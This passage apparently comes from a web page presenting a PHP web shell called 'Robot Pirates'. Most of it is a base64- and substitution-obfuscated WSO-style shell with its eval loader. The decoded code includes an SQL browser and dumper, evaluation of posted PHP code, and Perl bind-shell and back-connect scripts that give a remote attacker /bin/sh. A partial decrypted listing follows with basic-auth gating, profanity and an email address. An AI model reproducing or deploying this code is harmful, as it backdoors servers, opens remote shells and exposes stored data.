jFsNXJ0KCJFcnIyciEgQzFuXCd0IDJwNW4gZjRsNSIpO3c0bmQydy5oNHN0MnJ5LmIxY2soLTYpPC9zY3I0cHQ+Jyk7DQoJfQ0KCXdzMkg1MWQ1cigpOw0KCTVjaDIgIg0KPGg2PlNxbCBicjJ3czVyPC9oNj48ZDR2IGNsMXNzPWMybnQ1bnQ+DQo8ZjJybSBuMW01PSdzZicgbTV0aDJkPSdwMnN0JyAybnMzYm00dD0nZnModGg0cyk7Jz48dDFibDUgYzVsbHAxZGQ0bmc9J2EnIGM1bGxzcDFjNG5nPScwJz48dHI+DQo8dGQ+VHlwNTwvdGQ+PHRkPkgyc3Q8L3RkPjx0ZD5MMmc0bjwvdGQ+PHRkPlAxc3N3MnJkPC90ZD48dGQ+RDF0MWIxczU8L3RkPjx0ZD48L3RkPjwvdHI+PHRyPg0KPDRucDN0IHR5cDU9aDRkZDVuIG4xbTU9MSB2MWwzNT1TcWw+PDRucDN0IHR5cDU9aDRkZDVuIG4xbTU9cDYgdjFsMzU9J3EzNXJ5Jz48NG5wM3QgdHlwNT1oNGRkNW4gbjFtNT1wYSB2MWwzNT0nJz48NG5wM3QgdHlwNT1oNGRkNW4gbjFtNT1jIHYxbDM1PSciLiBodG1sc3A1YzQxbGNoMXJzKCRHTE9CQUxTWydjd2QnXSkgLiInPjw0bnAzdCB0eXA1PWg0ZGQ1biBuMW01PWNoMXJzNXQgdjFsMzU9JyIuICg0c3M1dCgkX1BPU1RbJ2NoMXJzNXQnXSk/JF9QT1NUWydjaDFyczV0J106JycpIC4iJz4NCjx0ZD48czVsNWN0IG4xbTU9J3R5cDUnPjwycHQ0Mm4gdjFsMzU9J215c3FsJyAiOw0KICAgIDRmKEAkX1BPU1RbJ3R5cDUnXT09J215c3FsJyk1Y2gyICdzNWw1Y3Q1ZCc7DQo1Y2gyICI+TXlTcWw8LzJwdDQybj48MnB0NDJuIHYxbDM1PSdwZ3NxbCcgIjsNCjRmKEAkX1BPU1RbJ3R5cDUnXT09J3Bnc3FsJyk1Y2gyICdzNWw1Y3Q1ZCc7DQo1Y2gyICI+UDJzdGdyNVNxbDwvMnB0NDJuPjwvczVsNWN0PjwvdGQ+DQo8dGQ+PDRucDN0IHR5cDU9dDV4dCBuMW01PXNxbF9oMnN0IHYxbDM1PSciLiAoNW1wdHkoJF9QT1NUWydzcWxfaDJzdCddKT8nbDJjMWxoMnN0JzpodG1sc3A1YzQxbGNoMXJzKCRfUE9TVFsnc3FsX2gyc3QnXSkpIC4iJz48L3RkPg0KPHRkPjw0bnAzdCB0eXA1PXQ1eHQgbjFtNT1zcWxfbDJnNG4gdjFsMzU9JyIuICg1bXB0eSgkX1BPU1RbJ3NxbF9sMmc0biddKT8ncjIydCc6aHRtbHNwNWM0MWxjaDFycygkX1BPU1RbJ3NxbF9sMmc0biddKSkgLiInPjwvdGQ+DQo8dGQ+PDRucDN0IHR5cDU9dDV4dCBuMW01PXNxbF9wMXNzIHYxbDM1PSciLiAoNW1wdHkoJF9QT1NUWydzcWxfcDFzcyddKT8nJzpodG1sc3A1YzQxbGNoMXJzKCRfUE9TVFsnc3FsX3Axc3MnXSkpIC4iJz48L3RkPjx0ZD4iOw0KCSR0bXAgPSAiPDRucDN0IHR5cDU9dDV4dCBuMW01PXNxbF9iMXM1IHYxbDM1PScnPiI7DQoJNGYoNHNzNXQoJF9QT1NUWydzcWxfaDJzdCddKSl7DQoJCTRmKCRkYi0+YzJubjVjdCgkX1BPU1RbJ3NxbF9oMnN0J10sICRfUE9TVFsnc3FsX2wyZzRuJ10sICRfUE9TVFsnc3FsX3Axc3MnXSwgJF9QT1NUWydzcWxfYjFzNSddKSkgew0KCQkJc3c0dGNoKCRfUE9TVFsnY2gxcnM1dCddKSB7DQoJCQkJYzFzNSAiVzRuZDJ3cy02YWk2IjogJGRiLT5zNXRDaDFyczV0KCdjcDZhaTYnKTsgYnI1MWs7DQoJCQkJYzFzNSAiVVRGLTgiOiAkZGItPnM1dENoMXJzNXQoJzN0ZjgnKTsgYnI1MWs7DQoJCQkJYzFzNSAiS09JOC1SIjogJGRiLT5zNXRDaDFyczV0KCdrMjQ4cicpOyBicjUxazsNCgkJCQljMXM1ICJLT0k4LVUiOiAkZGItPnM1dENoMXJzNXQoJ2syNDgzJyk7IGJyNTFrOw0KCQkJCWMxczUgImNwOGVlIjogJGRiLT5zNXRDaDFyczV0KCdjcDhlZScpOyBicjUxazsNCgkJCX0NCgkJCSRkYi0+bDRzdERicygpOw0KCQkJNWNoMiAiPHM1bDVjdCBuMW01PXNxbF9iMXM1PjwycHQ0Mm4gdjFsMzU9Jyc+PC8ycHQ0Mm4+IjsNCgkJCXdoNGw1KCQ0dDVtID0gJGRiLT5mNXRjaCgpKSB7DQoJCQkJbDRzdCgkazV5LCAkdjFsMzUpID0gNTFjaCgkNHQ1bSk7DQoJCQkJNWNoMiAnPDJwdDQybiB2MWwzNT0iJy4kdjFsMzUuJyIgJy4oJHYxbDM1PT0kX1BPU1RbJ3NxbF9iMXM1J10/J3M1bDVjdDVkJzonJykuJz4nLiR2MWwzNS4nPC8ycHQ0Mm4+JzsNCgkJCX0NCgkJCTVjaDIgJzwvczVsNWN0Pic7DQoJCX0NCgkJNWxzNSA1Y2gyICR0bXA7DQoJfTVsczUNCgkJNWNoMiAkdG1wOw0KCTVjaDIgIjwvdGQ+DQoJCQkJPHRkPjw0bnAzdCB0eXA1PXMzYm00dCB2MWwzNT0nPj4nIDJuY2w0Y2s9J2ZzKGQuc2YpOyc+PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+PDRucDN0IHR5cDU9Y2g1Y2tiMnggbjFtNT1zcWxfYzIzbnQgdjFsMzU9JzJuJyIgLiAoNW1wdHkoJF9QT1NUWydzcWxfYzIzbnQnXSk/Jyc6JyBjaDVjazVkJykgLiAiPiBjMjNudCB0aDUgbjNtYjVyIDJmIHIyd3M8L3RkPg0KCQkJPC90cj4NCgkJPC90MWJsNT4NCgkJPHNjcjRwdD4NCiAgICAgICAgICAgIHNfZGI9JyIuQDFkZHNsMXNoNXMoJF9QT1NUWydzcWxfYjFzNSddKS4iJzsNCiAgICAgICAgICAgIGYzbmN0NDJuIGZzKGYpIHsNCiAgICAgICAgICAgICAgICA0ZihmLnNxbF9iMXM1LnYxbDM1IT1zX2RiKSB7IGYuMm5zM2JtNHQgPSBmM25jdDQybigpIHt9Ow0KICAgICAgICAgICAgICAgICAgICA0ZihmLnA2KSBmLnA2LnYxbDM1PScnOw0KICAgICAgICAgICAgICAgICAgICA0ZihmLnBhKSBmLnBhLnYxbDM1PScnOw0KICAgICAgICAgICAgICAgICAgICA0ZihmLnBvKSBmLnBvLnYxbDM1PScnOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCgkJCWYzbmN0NDJuIHN0KHQsbCkgew0KCQkJCWQuc2YucDYudjFsMzUgPSAnczVsNWN0JzsNCgkJCQlkLnNmLnBhLnYxbDM1ID0gdDsNCiAgICAgICAgICAgICAgICA0ZihsICYmIGQuc2YucG8pIGQuc2YucG8udjFsMzUgPSBsOw0KCQkJCWQuc2YuczNibTR0KCk7DQoJCQl9DQoJCQlmM25jdDQybiA0cygpIHsNCgkJCQlmMnIoND0wOzQ8ZC5zZi41bDVtNW50c1sndGJsW10nXS5sNW5ndGg7Kys0KQ0KCQkJCQlkLnNmLjVsNW01bnRzWyd0YmxbXSddWzRdLmNoNWNrNWQgPSAhZC5zZi41bDVtNW50c1sndGJsW10nXVs0XS5jaDVjazVkOw0KCQkJfQ0KCQk8L3NjcjRwdD4iOw0KCTRmKDRzczV0KCRkYikgJiYgJGRiLT5sNG5rKXsNCgkJNWNoMiAiPGJyLz48dDFibDUgdzRkdGg9NjAwJSBjNWxscDFkZDRuZz1hIGM1bGxzcDFjNG5nPTA+IjsNCgkJCTRmKCE1bXB0eSgkX1BPU1RbJ3NxbF9iMXM1J10pKXsNCgkJCQkkZGItPnM1bDVjdGRiKCRfUE9TVFsnc3FsX2IxczUnXSk7DQoJCQkJNWNoMiAiPHRyPjx0ZCB3NGR0aD02IHN0eWw1PSdiMnJkNXItdDJwOmFweCBzMmw0ZCAjZWVlOyc+PHNwMW4+VDFibDVzOjwvc3Axbj48YnI+PGJyPiI7DQoJCQkJJHRibHNfcjVzID0gJGRiLT5sNHN0VDFibDVzKCk7DQoJCQkJd2g0bDUoJDR0NW0gPSAkZGItPmY1dGNoKCR0YmxzX3I1cykpIHsNCgkJCQkJbDRzdCgkazV5LCAkdjFsMzUpID0gNTFjaCgkNHQ1bSk7DQogICAgICAgICAgICAgICAgICAgIDRmKCE1bXB0eSgkX1BPU1RbJ3NxbF9jMjNudCddKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICRuID0gJGRiLT5mNXRjaCgkZGItPnEzNXJ5KCdTRUxFQ1QgQ09VTlQoKikgMXMgbiBGUk9NICcuJHYxbDM1LicnKSk7DQoJCQkJCSR2MWwzNSA9IGh0bWxzcDVjNDFsY2gxcnMoJHYxbDM1KTsNCgkJCQkJNWNoMiAiPG4yYnI+PDRucDN0IHR5cDU9J2NoNWNrYjJ4JyBuMW01PSd0YmxbXScgdjFsMzU9JyIuJHYxbDM1LiInPiZuYnNwOzwxIGhyNWY9IyAybmNsNGNrPVwic3QoJyIuJHYxbDM1LiInLDYpXCI+Ii4kdjFsMzUuIjwvMT4iIC4gKDVtcHR5KCRfUE9TVFsnc3FsX2MyM250J10pPycmbmJzcDsnOiIgPHNtMWxsPih7JG5bJ24nXX0pPC9zbTFsbD4iKSAuICI8L24yYnI+PGJyPiI7DQoJCQkJfQ0KCQkJCTVjaDIgIjw0bnAzdCB0eXA1PSdjaDVja2IyeCcgMm5jbDRjaz0nNHMoKTsnPiA8NG5wM3QgdHlwNT1iM3R0Mm4gdjFsMzU9J0QzbXAnIDJuY2w0Y2s9J2QyYzNtNW50LnNmLnBhLnYxbDM1PVwiZDJ3bmwyMWRcIjtkMmMzbTVudC5zZi5zM2JtNHQoKTsnPjxicj5GNGw1IHAxdGg6PDRucDN0IHR5cDU9dDV4dCBuMW01PWY0bDUgdjFsMzU9J2QzbXAuc3FsJz48L3RkPjx0ZCBzdHlsNT0nYjJyZDVyLXQycDphcHggczJsNGQgI2VlZTsnPiI7DQoJCQkJNGYoQCRfUE9TVFsncDYnXSA9PSAnczVsNWN0Jykgew0KCQkJCQkkX1BPU1RbJ3A2J10gPSAncTM1cnknOw0KICAgICAgICAgICAgICAgICAgICAkX1BPU1RbJ3BvJ10gPSAkX1BPU1RbJ3BvJ10/JF9QT1NUWydwbyddOjY7DQoJCQkJCSRkYi0+cTM1cnkoJ1NFTEVDVCBDT1VOVCgqKSAxcyBuIEZST00gJyAuICRfUE9TVFsncGEnXSk7DQoJCQkJCSRuM20gPSAkZGItPmY1dGNoKCk7DQoJCQkJCSRwMWc1cyA9IGM1NGwoJG4zbVsnbiddIC8gbzApOw0KICAgICAgICAgICAgICAgICAgICA1Y2gyICI8c2NyNHB0PmQuc2YuMm5zM2JtNHQ9ZjNuY3Q0Mm4oKXtzdChcIiIgLiAkX1BPU1RbJ3BhJ10gLiAiXCIsIGQuc2YucG8udjFsMzUpfTwvc2NyNHB0PjxzcDFuPiIuJF9QT1NUWydwYSddLiI8L3NwMW4+ICh7JG4zbVsnbiddfSByNWMycmRzKSBQMWc1ICMgPDRucDN0IHR5cDU9dDV4dCBuMW01PSdwbycgdjFsMzU9IiAuICgoNG50KSRfUE9TVFsncG8nXSkgLiAiPiI7DQogICAgICAgICAgICAgICAgICAgIDVjaDIgIiAyZiAkcDFnNXMiOw0KICAgICAgICAgICAgICAgICAgICA0ZigkX1BPU1RbJ3BvJ10gPiA2KQ0KICAgICAgICAgICAgICAgICAgICAgICAgNWNoMiAiIDwxIGhyNWY9IyAybmNsNGNrPSdzdChcIiIgLiAkX1BPU1RbJ3BhJ10gLiAnIiwgJyAuICgkX1BPU1RbJ3BvJ10tNikgLiAiKSc+Jmx0OyBQcjV2PC8xPiI7DQogICAgICAgICAgICAgICAgICAgIDRmKCRfUE9TVFsncG8nXSA8ICRwMWc1cykNCiAgICAgICAgICAgICAgICAgICAgICAgIDVjaDIgIiA8MSBocjVmPSMgMm5jbDRjaz0nc3QoXCIiIC4gJF9QT1NUWydwYSddIC4gJyIsICcgLiAoJF9QT1NUWydwbyddKzYpIC4gIiknPk41eHQgJmd0OzwvMT4iOw0KICAgICAgICAgICAgICAgICAgICAkX1BPU1RbJ3BvJ10tLTsNCgkJCQkJNGYoJF9QT1NUWyd0eXA1J109PSdwZ3NxbCcpDQoJCQkJCQkkX1BPU1RbJ3BhJ10gPSAnU0VMRUNUICogRlJPTSAnLiRfUE9TVFsncGEnXS4nIExJTUlUIG8wIE9GRlNFVCAnLigkX1BPU1RbJ3BvJ10qbzApOw0KCQkJCQk1bHM1DQoJCQkJCQkkX1BPU1RbJ3BhJ10gPSAnU0VMRUNUICogRlJPTSBgJy4kX1BPU1RbJ3BhJ10uJ2AgTElNSVQgJy4oJF9QT1NUWydwbyddKm8wKS4nLG8wJzsNCgkJCQkJNWNoMiAiPGJyPjxicj4iOw0KCQkJCX0NCgkJCQk0ZigoQCRfUE9TVFsncDYnXSA9PSAncTM1cnknKSAmJiAhNW1wdHkoJF9QT1NUWydwYSddKSkgew0KCQkJCQkkZGItPnEzNXJ5KEAkX1BPU1RbJ3BhJ10pOw0KCQkJCQk0ZigkZGItPnI1cyAhPT0gZjFsczUpIHsNCgkJCQkJCSR0NHRsNSA9IGYxbHM1Ow0KCQkJCQkJNWNoMiAnPHQxYmw1IHc0ZHRoPTYwMCUgYzVsbHNwMWM0bmc9NiBjNWxscDFkZDRuZz1hIGNsMXNzPW0xNG4gc3R5bDU9ImIxY2tncjIzbmQtYzJsMnI6I2E5YTlhOSI+JzsNCgkJCQkJCSRsNG41ID0gNjsNCgkJCQkJCXdoNGw1KCQ0dDVtID0gJGRiLT5mNXRjaCgpKQl7DQoJCQkJCQkJNGYoISR0NHRsNSkJew0KCQkJCQkJCQk1Y2gyICc8dHI+JzsNCgkJCQkJCQkJZjJyNTFjaCgkNHQ1bSAxcyAkazV5ID0+ICR2MWwzNSkNCgkJCQkJCQkJCTVjaDIgJzx0aD4nLiRrNXkuJzwvdGg+JzsNCgkJCQkJCQkJcjVzNXQoJDR0NW0pOw0KCQkJCQkJCQkkdDR0bDU9dHIzNTsNCgkJCQkJCQkJNWNoMiAnPC90cj48dHI+JzsNCgkJCQkJCQkJJGw0bjUgPSBhOw0KCQkJCQkJCX0NCgkJCQkJCQk1Y2gyICc8dHIgY2wxc3M9ImwnLiRsNG41LiciPic7DQoJCQkJCQkJJGw0bjUgPSAkbDRuNT09Nj9hOjY7DQoJCQkJCQkJZjJyNTFjaCgkNHQ1bSAxcyAkazV5ID0+ICR2MWwzNSkgew0KCQkJCQkJCQk0ZigkdjFsMzUgPT0gbjNsbCkNCgkJCQkJCQkJCTVjaDIgJzx0ZD48ND5uM2xsPC80PjwvdGQ+JzsNCgkJCQkJCQkJNWxzNQ0KCQkJCQkJCQkJNWNoMiAnPHRkPicubmxhYnIoaHRtbHNwNWM0MWxjaDFycygkdjFsMzUpKS4nPC90ZD4nOw0KCQkJCQkJCX0NCgkJCQkJCQk1Y2gyICc8L3RyPic7DQoJCQkJCQl9DQoJCQkJCQk1Y2gyICc8L3QxYmw1Pic7DQoJCQkJCX0gNWxzNSB7DQoJCQkJCQk1Y2gyICc8ZDR2PjxiPkVycjJyOjwvYj4gJy5odG1sc3A1YzQxbGNoMXJzKCRkYi0+NXJyMnIoKSkuJzwvZDR2Pic7DQoJCQkJCX0NCgkJCQl9DQoJCQkJNWNoMiAiPGJyPjwvZjJybT48ZjJybSAybnMzYm00dD0nZC5zZi5wNi52MWwzNT1cInEzNXJ5XCI7ZC5zZi5wYS52MWwzNT10aDRzLnEzNXJ5LnYxbDM1O2QyYzNtNW50LnNmLnMzYm00dCgpO3I1dDNybiBmMWxzNTsnPjx0NXh0MXI1MSBuMW01PSdxMzVyeScgc3R5bDU9J3c0ZHRoOjYwMCU7aDU0Z2h0OjYwMHB4Jz4iOw0KICAgICAgICAgICAgICAgIDRmKCE1bXB0eSgkX1BPU1RbJ3BhJ10pICYmICgkX1BPU1RbJ3A2J10gIT0gJ2wyMWRmNGw1JykpDQogICAgICAgICAgICAgICAgICAgIDVjaDIgaHRtbHNwNWM0MWxjaDFycygkX1BPU1RbJ3BhJ10pOw0KICAgICAgICAgICAgICAgIDVjaDIgIjwvdDV4dDFyNTE+PGJyLz48NG5wM3QgdHlwNT1zM2JtNHQgdjFsMzU9J0V4NWMzdDUnPiI7DQoJCQkJNWNoMiAiPC90ZD48L3RyPiI7DQoJCQl9DQoJCQk1Y2gyICI8L3QxYmw1PjwvZjJybT48YnIvPiI7DQogICAgICAgICAgICA0ZigkX1BPU1RbJ3R5cDUnXT09J215c3FsJykgew0KICAgICAgICAgICAgICAgICRkYi0+cTM1cnkoIlNFTEVDVCA2IEZST00gbXlzcWwuM3M1ciBXSEVSRSBjMm5jMXQoYDNzNXJgLCAnQCcsIGBoMnN0YCkgPSBVU0VSKCkgQU5EIGBGNGw1X3ByNHZgID0gJ3knIik7DQogICAgICAgICAgICAgICAgNGYoJGRiLT5mNXRjaCgpKQ0KICAgICAgICAgICAgICAgICAgICA1Y2gyICI8ZjJybSAybnMzYm00dD0nZC5zZi5wNi52MWwzNT1cImwyMWRmNGw1XCI7ZDJjM201bnQuc2YucGEudjFsMzU9dGg0cy5mLnYxbDM1O2QyYzNtNW50LnNmLnMzYm00dCgpO3I1dDNybiBmMWxzNTsnPjxzcDFuPkwyMWQgZjRsNTwvc3Axbj4gPDRucDN0ICBjbDFzcz0ndDIybHNJbnAnIHR5cDU9dDV4dCBuMW01PWY+PDRucDN0IHR5cDU9czNibTR0IHYxbDM1PSc+Pic+PC9mMnJtPiI7DQogICAgICAgICAgICB9DQoJCQk0ZihAJF9QT1NUWydwNiddID09ICdsMjFkZjRsNScpIHsNCgkJCQkkZjRsNSA9ICRkYi0+bDIxZEY0bDUoJF9QT1NUWydwYSddKTsNCgkJCQk1Y2gyICc8cHI1IGNsMXNzPW1sNj4nLmh0bWxzcDVjNDFsY2gxcnMoJGY0bDVbJ2Y0bDUnXSkuJzwvcHI1Pic7DQoJCQl9DQoJfSA1bHM1IHsNCiAgICAgICAgNWNoMiBodG1sc3A1YzQxbGNoMXJzKCRkYi0+NXJyMnIoKSk7DQogICAgfQ0KCTVjaDIgJzwvZDR2Pic7DQoJd3MyRjIydDVyKCk7DQp9DQpmM25jdDQybiAxY3Q0Mm5ONXR3MnJrKCkgew0KCXdzMkg1MWQ1cigpOw0KCSRiMWNrX2Mybm41Y3RfcD0iSXlFdmRYTnlMYUpwYjQ5d1pYSnNEUXA2Y2FVZ1VhOWoxYVYwT3cwS0pHbGhaR1J5UFdsM1pYUmZZWFJ2YjRna1FWSkhWbHN3WFNrZ2ZId2daR2xsS0NKRmNuSnZjajJnSkNGY2I0SXBPdzBLSkhCaFpHUnlQWE52WWF0aFpHUnlYYWwzS0NSQlVrZFdXekZkTENBazFXRmtaSElwSUh4OElHUnBaU2c0UlhKeWJvSWVJQ1FoWEd1NEtUc05DNFJ3Y205MGJ6Nm5aWFJ3Y205MGJhSmlibUZ0WlNnbmRHTndKeWs3RFFwemJhTnJaWFEyVTA5RFMwVlVMQ0JRUmw5SlRrVlVMQ0JUVDBOTFg2TlVVa1ZCVFN3Z0pIQnlib1J2S1NCOGZDQmsxV1UySWtWeWNtOXlPNEFrSVZ4M0k0azdEUXBqYmFpM1pXTjBLRk5QUTB0RlZDd2dKSEJoWkdSeUtTQjhmQ0JrMVdVMklrVnljbTl5TzRBa0lWeDNJNGs3RFFwdmNHVjNLRk5VUkVsT0xDQTRQNFpUVDBOTFJWUTRLVHNOQ205d1pXdTJVNlJFVDZWVUxDQTRQNFpUVDBOTFJWUTRLVHNOQ205d1pXdTJVNlJFUlZKU0xDQTRQNFpUVDBOTFJWUTRLVHNOQ25OaWNvUmxiU2duTGFKcGI0OXoxQ0F0MVNjcE93MEtZYXh2Y2FVMlU2UkVTVXVwT3cwS1lheHZjYVUyVTZSRVQ2VlVLVHNOQ21Oc2JvTmxLRk5VUkVWU1U0azciOw0KCSRiNG5kX3AycnRfcD0iSXlFdmRYTnlMYUpwYjQ5d1pYSnNEUTJrVTBoRlRFdzlJNDk0MVd1dmNhZ2dMV2s0T3cwSzFXWWdLRUJCVWtkV0lEd2dNU2tnNXlCbDVHbDBLREVwT3lCOURRcDZjYVVnVWE5ajFhVjBPdzBLY2E5ajFhVjBLRk1zSmxCR1gwbE9SVlFzSmxOUFEwdGZVNlJTUlVGTkxHZGxkSEJ5Ym9SdllubDNZVzZsS0NkMFlvQW5LU2tnZkh3Z1pHbGxJQ0pEWVdpMElHTnlaV0YwWlNCemJhTnJaWFJjYjRJN0RRcHpaWFJ6YmFOcmJvQjBLRk1zVTA5TVg2TlBRMHRGVkN4VFQ2OVNSVlZUUlVGRVJGSXNNU2s3RFFwNDFXaWtLRk1zY2E5ajFhRmtaSEpmMVd1MkpFRlNSNlpiTUYwc1NVaUJSRVJTWDBGT1dTa3BJSHg4SUdScFpTQTRRYUYzZENCdmNHVjNJSEJ2Y25SY2I0STdEUXBzMVhOMFpXdTJVeXd6S1NCOGZDQmsxV1VnSWtOaGJuUWdiR2x6ZEdWM0lIQnZjblJjYjRJN0RRcG8xR2xzWlNneEtTQjdEUTJKWVdOalpYQjBLRU5QVGt1c1V5azdEUTJKMVdZMklTZ2tjR2xrUFdadmNtc3BLU0I3RFEySkNXUnBaU0E0UWFGM2JtOTBJR1p2Y21zNElHbG1JQ2doWkdWbTFXaWxaQ0FrY0dsa0tUc05DZ2tKYm9CbGI0QlRWRVJKVDR3NFBDWkRUMGlPSWpzTkNna0pib0JsYjRCVFZFUlBWVlFzSWp1bVEwOU9UNEk3RFEySkNXOXdaV3VnVTZSRVJWSlNMQ0krSmtOUFRrdTRPdzBLQ1FsbDVHVmpJQ1JUU0VWTVRDQjhmQ0JrMVdVZ2NISnBiblFnUTA5T1Q0QTRRYUYzZENCbDVHVmpkWFJsSUNSVFNFVk1URngzSWpzTkNna0pZYXh2Y2FVZ1EwOU9UanNOQ2drSlpYaHBkQ0F3T3cwS0NYME5DbjA9IjsNCgk1Y2gyICI8aDY+TjV0dzJyayB0MjJsczwvaDY+PGQ0diBjbDFzcz1jMm50NW50Pg0KCTxmMnJtIG4xbTU9J25mcCcgMm5TM2JtNHQ9XCJnKG4zbGwsbjNsbCwnYnBwJyx0aDRzLnAycnQudjFsMzUpO3I1dDNybiBmMWxzNTtcIj4NCgk8c3Axbj5CNG5kIHAycnQgdDIgL2I0bi9zaCBbcDVybF08L3NwMW4+PGJyLz4NCglQMnJ0OiA8NG5wM3QgdHlwNT0ndDV4dCcgbjFtNT0ncDJydCcgdjFsMzU9J282b283Jz4gPDRucDN0IHR5cDU9czNibTR0IHYxbDM1PSc+Pic+DQoJPC9mMnJtPg0KCTxmMnJtIG4xbTU9J25mcCcgMm5TM2JtNHQ9XCJnKG4zbGwsbjNsbCwnYmNwJyx0aDRzLnM1cnY1ci52MWwzNSx0aDRzLnAycnQudjFsMzUpO3I1dDNybiBmMWxzNTtcIj4NCgk8c3Axbj5CMWNrLWMybm41Y3QgIFtwNXJsXTwvc3Axbj48YnIvPg0KCVM1cnY1cjogPDRucDN0IHR5cDU9J3Q1eHQnIG4xbTU9J3M1cnY1cicgdjFsMzU9JyIuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4iJz4gUDJydDogPDRucDN0IHR5cDU9J3Q1eHQnIG4xbTU9J3AycnQnIHYxbDM1PSdvNm9vNyc+IDw0bnAzdCB0eXA1PXMzYm00dCB2MWwzNT0nPj4nPg0KCTwvZjJybT48YnI+IjsNCgk0Zig0c3M1dCgkX1BPU1RbJ3A2J10pKSB7DQoJCWYzbmN0NDJuIGNmKCRmLCR0KSB7DQoJCQkkdyA9IEBmMnA1bigkZiwidyIpIDJyIEBmM25jdDQybl81eDRzdHMoJ2Y0bDVfcDN0X2MybnQ1bnRzJyk7DQoJCQk0Zigkdyl7DQoJCQkJQGZ3cjR0NSgkdyxAYjFzNWV1X2Q1YzJkNSgkdCkpOw0KCQkJCUBmY2wyczUoJHcpOw0KCQkJfQ0KCQl9DQoJCTRmKCRfUE9TVFsncDYnXSA9PSAnYnBwJykgew0KCQkJY2YoIi90bXAvYnAucGwiLCRiNG5kX3AycnRfcCk7DQoJCQkkMjN0ID0gd3MyRXgoInA1cmwgL3RtcC9icC5wbCAiLiRfUE9TVFsncGEnXS4iIDY+L2Q1di9uM2xsIGE+JjYgJiIpOw0KCQkJNWNoMiAiPHByNSBjbDFzcz1tbDY+JDIzdFxuIi53czJFeCgicHMgMTN4IHwgZ3I1cCBicC5wbCIpLiI8L3ByNT4iOw0KICAgICAgICAgICAgM25sNG5rKCIvdG1wL2JwLnBsIik7DQoJCX0NCgkJNGYoJF9QT1NUWydwNiddID09ICdiY3AnKSB7DQoJCQljZigiL3RtcC9iYy5wbCIsJGIxY2tfYzJubjVjdF9wKTsNCgkJCSQyM3QgPSB3czJFeCgicDVybCAvdG1wL2JjLnBsICIuJF9QT1NUWydwYSddLiIgIi4kX1BPU1RbJ3BvJ10uIiA2Pi9kNXYvbjNsbCBhPiY2ICYiKTsNCgkJCTVjaDIgIjxwcjUgY2wxc3M9bWw2PiQyM3RcbiIud3MyRXgoInBzIDEzeCB8IGdyNXAgYmMucGwiKS4iPC9wcjU+IjsNCiAgICAgICAgICAgIDNubDRuaygiL3RtcC9iYy5wbCIpOw0KCQl9DQoJfQ0KCTVjaDIgJzwvZDR2Pic7DQoJd3MyRjIydDVyKCk7DQp9DQpmM25jdDQybiAxY3Q0Mm5SQygpIHsNCgk0ZighQCRfUE9TVFsncDYnXSkgew0KCQkkMSA9IDFycjF5KA0KCQkJIjNuMW01IiA9PiBwaHBfM24xbTUoKSwNCgkJCSJwaHBfdjVyczQybiIgPT4gcGhwdjVyczQybigpLA0KCQkJIndzMl92NXJzNDJuIiA9PiBXU09fVkVSU0lPTiwNCgkJCSJzMWY1bTJkNSIgPT4gQDRuNF9nNXQoJ3MxZjVfbTJkNScpDQoJCSk7DQoJCTVjaDIgczVyNDFsNHo1KCQxKTsNCgl9IDVsczUgew0KCQk1djFsKCRfUE9TVFsncDYnXSk7DQoJfQ0KfQ0KNGYoIDVtcHR5KCRfUE9TVFsnMSddKSApDQoJNGYoNHNzNXQoJGQ1ZjEzbHRfMWN0NDJuKSAmJiBmM25jdDQybl81eDRzdHMoJzFjdDQybicgLiAkZDVmMTNsdF8xY3Q0Mm4pKQ0KCQkkX1BPU1RbJzEnXSA9ICRkNWYxM2x0XzFjdDQybjsNCgk1bHM1DQoJCSRfUE9TVFsnMSddID0gJ1M1Y0luZjInOw0KNGYoICE1bXB0eSgkX1BPU1RbJzEnXSkgJiYgZjNuY3Q0Mm5fNXg0c3RzKCcxY3Q0Mm4nIC4gJF9QT1NUWycxJ10pICkNCgljMWxsXzNzNXJfZjNuYygnMWN0NDJuJyAuICRfUE9TVFsnMSddKTsNCjV4NHQ7DQo/Pg==&#39;</span><span class="p">;</span><span class="k">eval</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">&#39;JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw==&#39;</span><span class="p">));</span><span class="cp">?&gt;</span><span class="x"></span></code></pre></div>

<h3>Robot Pirates Property Shell Source Code (decrypted)</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno">   1</span> <span class="cp">&lt;?php</span>
<span class="lineno">   2</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">   3</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_AUTH_USER&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_AUTH_USER&#39;</span><span class="p">])</span> <span class="o">!==</span> <span class="nv">$name</span> <span class="o">||</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_AUTH_PW&#39;</span><span class="p">])</span> <span class="o">!==</span> <span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">   4</span>         <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;WWW-Authenticate: Basic realm=&quot;Fuck if u are Lamer&quot;&#39;</span><span class="p">);</span>
<span class="lineno">   5</span>         <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;HTTP/1.0 401 Unauthorized&#39;</span><span class="p">);</span>
<span class="lineno">   6</span>         <span class="k">exit</span><span class="p">(</span><span class="s2">&quot;&lt;center&gt;&lt;b&gt;Robot pirates Property FuCk off Bitch&lt;/center&gt;&lt;/b&gt;&quot;</span><span class="p">);</span>
<span class="lineno">   7</span>     <span class="p">}</span>
<span class="lineno">   8</span> <span class="p">}</span>
<span class="lineno">   9</span> <span class="nv">$rar1</span> <span class="o">=</span> <span class="s2">&quot;robert.stewart678@gmail.com</span>
